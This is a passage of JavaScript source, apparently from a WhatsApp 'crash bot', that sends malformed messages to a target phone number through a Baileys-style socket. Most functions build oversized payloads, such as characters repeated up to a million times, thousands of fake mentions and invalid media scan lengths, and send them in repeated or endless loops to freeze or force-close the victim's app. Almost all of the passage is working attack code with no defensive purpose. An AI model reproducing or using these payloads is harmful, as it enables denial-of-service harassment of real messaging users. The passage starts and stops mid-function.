                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@fuckytim",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,pinzyX7",
                                videoContentCaption: "@fuckytim",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const X7 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: X7.message,
            },
        }, {
            messageId: X7.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}


async function X7Delay(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "𝖷𝟩",
                            matchedText: "https://t.me/fuckytim",
                            description: "𝖷𝟩",
                            title: "𝖷𝟩",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#X7",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
                                paymentLinkMetadata: {
                                    button: {
                                        displayText: "@fuckytim",
                                    },
                                    header: {
                                        headerType: 1,
                                    },
                                    provider: {
                                        paramsJson: "{{".repeat(120000),
                                    },
                                },
                                urlMetadata: {
                                    fbExperimentId: 999,
                                },
                                fbExperimentId: 888,
                                linkMediaDuration: 555,
                                socialMediaPostType: 1221,
                                videoContentUrl: "https://wa.me/settings/linked_devices#,,pinzyX7",
                                videoContentCaption: "@fuckytim",
                            },
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 999,
                                quotedMessage: {
                                    locationMessage: {
                                        degreesLatitude: 9.999999919991,
                                        degreesLongitude: -999999999999,
                                        accuracyInMeters: 1
                                    }
                                }
                            }
                        }
                    }
                }
            },
            { participant: { jid: target } }
        );
        
        let parse = true;
        let SID = "5e03e0";
        let key = "10000000_2203140470115547_947412155165083119_n.enc";
        let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
        let type = `image/webp`;
        if (11 > 9) {
            parse = parse ? false : true;
        }

        const stc = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
                        fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
                        fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
                        mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
                        mimetype: type,
                        directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
                        fileLength: {
                            low: Math.floor(Math.random() * 1000),
                            high: 0,
                            unsigned: true,
                        },
                        mediaKeyTimestamp: {
                            low: Math.floor(Math.random() * 1700000000),
                            high: 0,
                            unsigned: false,
                        },
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: {
                            low: Math.floor(Math.random() * -20000000),
                            high: 555,
                            unsigned: parse,
                        },
                        isAvatar: parse,
                        isAiSticker: parse,
                        isLottie: parse,
                    },
                },
            },
        }, {});

        const X7 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "#",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    },
                },
            },
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: stc.message,
            },
        }, {
            messageId: stc.key.id,
            participant: { jid: target },
        });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: X7.message,
            },
        }, {
            messageId: X7.key.id,
            participant: { jid: target },
        });

    } catch (err) {
        console.error("error:", err);
    }
}


async function DelayGalaxy(sock, target) {
  const vnxmsg = generateWAMessageFromContent(
    target,
    {
        interactiveResponseMessage: {
          body: {
            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
            title: "\u0000".repeat(250000)
            },
           nativeFlowResponseMessage: {
            name: "galaxy_message", 
            paramsJson: "\x10".repeat(1000000) + "\u0000".repeat(250000), 
            version: 3,
            sourceUrl: "t.me/pinzyoffc"
          },
           entryPointConversionSource: "call_permission_request"
        }
      },
    { userJid: target }
  );
        
  await sock.relayMessage(
    target,
      vnxmsg.message,
    {
      participant: { jid: target },
      messageId: vnxmsg.key.id
    }
  );
}

async function X7Forclose(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        caption: "Pinzy𝖷𝟩",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "pinzyX7",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );
}



async function X7ForcloseCombo(sock, target) {
    const kosong = "\u0000".repeat(500000);
    const spasi = " ".repeat(400000);
    const zero = "‍".repeat(600000);
    
   await sock.relayMessage(target, {
  "imageMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
    "mimetype": "image/jpeg",
    "fileSha256": "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
    "fileLength": "93217",
    "caption": "X7",
    "height": 1080,
    "width": 1080,
    "mediaKey": "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
    "fileEncSha256": "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
    "directPath": "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1778142659",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "isQuestion": true,
      "isGroupStatus": true
    },
    "scansSidecar": "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
    "scanLengths": [
      9999999999999999999,
      9999999999999999999,
      9999999999999999999,
      9999999999999999999
    ],
    "midQualityFileSha256": "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
  }
}, {})
    
    for (let i = 0; i < 30; i++) {
        try {
            await sock.relayMessage('status@broadcast', {
                interactiveResponseMessage: {
                    body: {
                        text: kosong,
                        format: 0
                    },
                    footer: {
                        text: spasi,
                        format: 0
                    },
                    nativeFlowResponseMessage: {
                        name: "silent_crash",
                        paramsJson: `{\"trigger\":\"${zero}\",\"delay\":5000}`,
                        version: 3
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: false
                    }
                }
            }, {
                messageId: "silent_" + Date.now() + "_" + i,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: { from: 'system@whatsapp.net' }
                }]
            });
            console.log(`[${i+1}/30] SILENT TAG KE ${target}`);
            await new Promise(x => setTimeout(x, 200));
        } catch(e) { console.log(e); }
    }
}

async function X7Klik(sock, target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" },
                    footer: { text: "NIH" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "Xyzen Official",
                                    status: "confirmed",
                                    business_name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
                                    service_name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "@pinzyoffc",
                                        phone: "628973824776"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}

async function Woam(target) {
    let cards = [];
    for(let z = 0; z < 30; z++) {
        cards.push({
            header: {
                title: "\0",
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                    fileLength: "93217",
                    caption: "pinzyX7",
                    height: 1080,
                    width: 1080,
                    mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                    fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                    directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1778142659",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIQERIxISIyQWL/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
                    contextInfo: {
                        pairedMediaType: "NOT_PAIRED_MEDIA",
                        isQuestion: true,
                        isGroupStatus: true
                    },
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [
                        9999999999999999999,
                        9999999999999999999,
                        9999999999999999999,
                        9999999999999999999
                    ],
                    midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
                },
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
            }
        })
    }
    const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "X7"
                    },
                    carouselMessage: {
                        cards
                    }
                }
            }
        }
    }, {})
    await sock.relayMessage(target, msg.message, {
        participant: { jid: target }
    })
}

async function dingleyhard(sock, target, ptcp = true) {
  const mentionedJidList = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1917 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
  ];

  const callPermissionMessage = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(10000),
            version: 3
          },
          contextInfo: {
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  };

  const addressMessage = {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\
                    "values": {\
                        "in_pin_code": "999999",\
                        "building_name": "KANJUT",\
                        "landmark_area": "H",\
                        "address": "XT",\
                        "tower_number": "XTX",\
                        "city": "Garut",\
                        "name": "Jawa_Barat",\
                        "phone_number": "999999999999",\
                        "house_number": "xxx",\
                        "floor_number": "xxx",\
                        "state": "D | ${"\u0000".repeat(900000)}"\
                    }\
                }`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363403941803439@newsletter",
          newsletterName: "idk",
          serverMessageId: 1000,
          accessibilityText: "idk"
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
    }
  };

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { 
                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄", 
                    format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 1000; r++) {
    const payload = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "{}"
          },
        },
      },
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: payload.message,
      },
    }, ptcp ? {
      messageId: payload.key.id,
      participant: { jid: target }
    } : {
      messageId: payload.key.id
    });
    await sleep(1000);
  }

  await sock.relayMessage(target, callPermissionMessage, {
    groupId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, addressMessage, {
    participant: { jid: target }
  });

  const msgLite = generateWAMessageFromContent(target, stickerMsg, {});
  await sock.relayMessage("status@broadcast", msgLite.message, {
    messageId: msgLite.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}


async function bulldozerX(sock, target) {
while (true) {
  await sock.relayMessage(
    target,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
                    format: "DEFAULT" 
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0007".repeat(90000),
                    version: 3
                  }
                }
              }
            }
          }
        },
        isCanceled: true,
        name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"999999",
          "building_name":"𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
          "landmark_area":"18",
          "address":"pinzyX7",
